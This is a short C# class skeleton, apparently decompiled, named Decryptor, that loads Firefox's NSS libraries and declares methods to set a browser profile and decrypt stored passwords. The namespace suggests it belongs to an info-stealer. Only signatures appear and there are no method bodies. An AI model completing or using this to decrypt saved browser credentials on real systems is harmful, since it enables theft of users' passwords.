using System;

namespace youknowcaliber;

public static class Decryptor
{
	private static IntPtr hNss3;

	private static IntPtr hMozGlue;

	private static Nss3.NssInit fpNssInit;

	private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;

	private static Nss3.NssShutdown fpNssShutdown;

	public static extern bool LoadNSS(string sPath);

	public static extern void UnLoadNSS();

	public static extern bool SetProfile(string sProfile);

	public static extern string DecryptPassword(string sEncPass);

	public static extern string GetUTF8(string sNonUtf8);
}
